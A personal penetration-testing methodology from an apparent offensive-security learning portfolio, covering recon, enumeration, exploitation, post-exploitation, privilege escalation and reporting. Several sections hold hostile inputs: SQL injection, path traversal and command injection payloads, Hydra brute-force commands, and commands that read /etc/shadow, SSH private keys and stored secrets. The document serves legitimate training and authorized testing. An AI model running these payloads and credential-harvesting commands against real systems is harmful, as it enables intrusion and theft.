# Penetration Testing Methodology
**Author:** Brent Yoshida  
**Created:** April 2026  
**Status:** Living document: updated after every engagement, machine, and course  

---

## Philosophy

Every system has a way in. The job is to find it before someone who shouldn't.

This methodology isn't a checklist to race through; it's a thinking framework. The goal at every phase is to understand what you're looking at before deciding what to do with it. Rushing enumeration to get to exploitation is the fastest way to miss the finding that matters.

Puzzles have always been the pull for me. This field is the largest, most consequential puzzle I've encountered. The methodology is how I make sure I'm solving it systematically rather than just getting lucky.

---

## Core Principles

**Read the spec before connecting.**
Every engagement, every machine, every challenge comes with information. Scope documents, challenge descriptions, provided credentials, port specifications. Missing a port number or a username in the brief costs time and creates noise. Read everything first.

**Verify before scanning.**
Confirm the target is reachable before running any tools. `ping` is one command. Scanning a host that isn't up wastes time and produces misleading output.

**Document everything, in real time.**
Notes taken during a session are more accurate than notes reconstructed afterward. Every command run, every output received, every dead end explored. The engagement report and the GitHub write-up both depend on what gets captured during the work, not after.

**Dead ends are data.**
A path that doesn't work tells you something. Document what you tried, what the response was, and what it implied. In a real engagement that failed attempt might be what identifies the actual attack surface. In a write-up it's what separates a methodology document from a tutorial.

**Understand before moving on.**
If a command worked but you don't know why, stop. Look it up. The goal isn't to collect flags; it's to build a transferable skill set. A technique understood at the mechanism level applies everywhere. A technique memorized as a sequence of commands applies only where you've seen it before.

---

## Phase 1: Reconnaissance

### Passive Recon
Gather information without touching the target. No active connections. No scan traffic.

```bash
# WHOIS: registrant info, nameservers, registration dates
whois [domain]

# DNS records: A, MX, NS, TXT, zone transfer attempts
dnsrecon -d [domain]

# Subdomain enumeration: find assets not linked publicly
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://[domain] -H "Host: FUZZ.[domain]"

# Google dorks: find indexed sensitive content
site:[domain] filetype:pdf
site:[domain] inurl:admin
site:[domain] "password" OR "credentials"
```

**What I'm looking for:** Org structure, technology stack hints, exposed subdomains, email formats, any public-facing infrastructure that wasn't the obvious entry point.

### Active Recon
Direct interaction with the target begins here. Generates traffic and potentially logs.

```bash
# Confirm host is live before anything else
ping -c 4 [IP]

# Initial scan: top 1000 ports, fast
nmap [IP]

# ALWAYS follow with full port scan: non-standard ports are frequently where findings live
nmap -p- [IP]

# Service version + default scripts + OS detection on discovered ports
nmap -sV -sC -O -p [ports] [IP]

# Save output: always
nmap -sV -sC -oA recon/nmap_initial [IP]

# UDP: slower but often overlooked
sudo nmap -sU --top-ports 100 [IP]
```

**What I'm looking for:** Every open port, every running service, every version number. Version information is what enables CVE research. Non-standard ports are where administrators hide services they assume nobody will find.

---

## Phase 2: Enumeration

Enumeration is recon with depth. Where recon maps the surface, enumeration maps what's underneath.

### Web Enumeration

```bash
# Technology fingerprinting first
whatweb http://[IP]

# Directory and file discovery
gobuster dir -u http://[IP] \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak,xml,conf \
  -o recon/gobuster_initial.txt

# Faster fuzzing with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u http://[IP]/FUZZ \
  -fc 404

# Virtual host enumeration
gobuster vhost -u http://[domain] \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Vulnerability scanning — noisy, generates logs
nikto -h http://[IP] -o recon/nikto.txt
```

### SMB Enumeration

```bash
# List shares: null session attempt
smbclient -L [IP] -N

# Detailed share and permission enumeration
enum4linux -a [IP]

# Permission mapping across all shares
smbmap -H [IP]

# Connect to specific share
smbclient \\\\[IP]\\[ShareName] -N
```

### FTP Enumeration

```bash
# Connect and try anonymous
ftp [IP]
# Username: anonymous  Password: (blank or anonymous)

# If connected
ftp> ls -la
ftp> pwd
ftp> get [filename]

# Bulk download everything accessible
wget -r ftp://[IP]/
```

### Other Services

```bash
# Redis — unauthenticated access check
redis-cli -h [IP] ping
redis-cli -h [IP] info
redis-cli -h [IP] keys *

# SSH: version and supported auth methods
ssh -v [user]@[IP]

# SMTP: user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t [IP]

# SNMP: community string check
snmpwalk -c public -v1 [IP]
```

**What I'm looking for:** Hidden content, misconfigured services, version-specific vulnerabilities, credentials stored in accessible locations, anything that shouldn't be publicly reachable.

---

## Phase 3: Exploitation

Exploitation only begins after enumeration is thorough. The finding is almost always in the enumeration. The exploitation is just acting on it.

### Pre-Exploitation Checklist
- [ ] All open ports identified including non-standard
- [ ] Service versions documented
- [ ] Web directories enumerated
- [ ] Default/anonymous credentials attempted on every applicable service
- [ ] Searchsploit run on every identified service version
- [ ] Notes organized and readable

### Vulnerability Research

```bash
# Search local exploit database by service and version
searchsploit [service name]
searchsploit [service] [version]

# Copy exploit to working directory: never run from database path
searchsploit -m [exploit/path]

# Check CVE details
# nvd.nist.gov/vuln/search
# exploit-db.com
```

### Web Exploitation

```bash
# Manual testing in Burp Suite before automated tools
# Proxy: 127.0.0.1:8080

# SQL injection: test manually first
' OR '1'='1
' OR '1'='1'--
admin'--

# SQLmap after manual confirmation
sqlmap -u "http://[IP]/page?id=1" --dbs
sqlmap -u "http://[IP]/page?id=1" -D [db] --tables
sqlmap -u "http://[IP]/page?id=1" -D [db] -T [table] --dump

# File inclusion testing
http://[IP]/page?file=../../../../etc/passwd
http://[IP]/page?file=php://filter/convert.base64-encode/resource=index.php

# Command injection
; id
| id
&& id
`id`
```

### Metasploit

```bash
msfconsole
search [vulnerability/service]
use [module]
show options
set RHOSTS [IP]
set LHOST [your IP]
run
```

### Credential Attacks

```bash
# Default credentials: always try manually first
# admin:admin, admin:password, root:(blank), administrator:administrator

# Hydra SSH
hydra -l [user] -P /usr/share/wordlists/rockyou.txt ssh://[IP]

# Hydra HTTP
hydra -l [user] -P /usr/share/wordlists/rockyou.txt [IP] \
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

## Phase 4: Post-Exploitation

Initial access is the beginning. Post-exploitation determines the actual impact.

### Immediate Steps After Shell

```bash
# Who am I
id
whoami

# Where am I
pwd
hostname
uname -a

# What OS and version
cat /etc/os-release
cat /etc/issue

# Network context
ip a
ip route
cat /etc/hosts

# Upgrade shell immediately
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

### Data Collection

```bash
# User accounts and context
cat /etc/passwd
cat /etc/shadow  (if readable)
cat /home/*/.bash_history 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# Interesting files
find / -name "*.conf" -readable 2>/dev/null
find / -name "*.config" -readable 2>/dev/null
find / -name "id_rsa" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "api_key\|secret\|token" /var/www/ 2>/dev/null

# Running processes and services
ps aux
netstat -tulnp
ss -tulnp
```

---

## Phase 5: Privilege Escalation

### Linux

```bash
# Sudo permissions — check GTFOBins for every binary listed
sudo -l

# SUID binaries — cross-reference with GTFOBins
find / -perm -4000 -type f 2>/dev/null

# Writable files and directories owned by root
find / -user root -writable -type f 2>/dev/null

# Cron jobs: look for writable scripts being called as root
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null

# Kernel version — check for kernel exploits
uname -a
# Search: Linux kernel [version] privilege escalation

# World-writable directories
find / -type d -perm -o+w 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

**Resources:** GTFOBins (gtfobins.github.io) — covers privesc techniques for almost every binary that appears in `sudo -l` or SUID results.

### Windows

```bash
# Current user and privileges: SeImpersonatePrivilege = potato attack
whoami /all

# System information and missing patches
systeminfo
wmic qfe list brief

# Local users and groups
net user
net localgroup administrators

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Stored credentials
cmdkey /list

# AlwaysInstallElevated registry check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Phase 6: Reporting

The report is the deliverable. A successful exploitation that isn't documented clearly is worthless to the client, and worthless to the portfolio.

### Write-Up Structure (GitHub / Portfolio)

Every machine and challenge gets a write-up. Minimum viable write-up is five sentences. Ideal write-up covers:

1. **Objective**: what the target is and what success looks like
2. **Enumeration**: what was found and how
3. **Exploitation**: what vulnerability was used and why it existed
4. **Post-exploitation / PrivEsc**: what access was achieved and how it was escalated
5. **Real-world application**: how this vulnerability or technique appears in real engagements
6. **Key takeaway**: one or two sentences on what this taught or reinforced

### Reporting Principles

- Findings documented with evidence: commands run, output received, screenshots
- Dead ends included: what was tried before the successful path
- Technical detail accurate: if you don't know why something worked, say so and then find out
- Real-world context connected: every finding maps to a genuine risk

---

## Tools Reference

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap | Port scanning, service detection, OS fingerprinting |
| Recon | dnsrecon | DNS enumeration and zone transfer attempts |
| Recon | whois | Domain registration and org information |
| Enumeration | gobuster / ffuf | Directory and virtual host brute forcing |
| Enumeration | nikto | Web vulnerability scanning |
| Enumeration | enum4linux | SMB and Samba enumeration |
| Enumeration | smbclient / smbmap | SMB share access and permission mapping |
| Exploitation | Burp Suite | Web application proxy and manual testing |
| Exploitation | sqlmap | SQL injection automation |
| Exploitation | Metasploit | Exploit framework and post-exploitation |
| Exploitation | searchsploit | Local exploit database search |
| PrivEsc | GTFOBins | Linux SUID and sudo bypass techniques |
| Passwords | Hydra | Online brute force (SSH, HTTP, FTP) |
| Passwords | Hashcat | GPU-accelerated offline hash cracking |
| Passwords | John the Ripper | CPU-based hash cracking |
| Utilities | netcat | Listeners, shell catching, file transfer |
| Utilities | tmux | Terminal multiplexing — run multiple sessions |

---

## Wordlists

```
/usr/share/wordlists/rockyou.txt          # Password cracking
/usr/share/seclists/Discovery/Web-Content/common.txt        # Directory brute force
/usr/share/seclists/Discovery/Web-Content/big.txt           # Extended directory brute force
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  # Subdomain enumeration
/usr/share/seclists/Usernames/top-usernames-shortlist.txt   # Username enumeration
```

---

## Ongoing Development

This document reflects current methodology as of April 2026. It will be updated as:

- New techniques are learned through TryHackMe and HackTheBox
- OSCP preparation introduces more advanced concepts
- Real-world engagement experience informs what actually matters versus what's theoretical

The gap between a beginner's methodology and an expert's methodology isn't the list of tools; it's the quality of thinking behind each step. That's what this document is really tracking.

---

*Part of the [Offensive Security Portfolio](../README.md)*  
*Last updated: April 2026*
